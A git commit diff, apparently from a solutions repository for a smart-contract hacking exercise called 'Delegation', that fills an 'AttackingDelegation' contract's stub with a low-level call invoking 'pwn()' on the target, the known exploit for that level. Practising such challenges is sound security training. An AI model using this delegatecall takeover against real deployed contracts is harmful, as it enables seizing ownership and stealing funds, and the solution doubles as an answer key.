51af8cfe1b3de606f81c16a2e8f1d4014bb11d8f
Vighnesh Rege <rege@fb.com>
2022-05-21 19:33:15 -0500

    Hacked second contract

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -10,6 +10,8 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call(
+            abi.encodeWithSignature("pwn()")
+        );
     }
 }
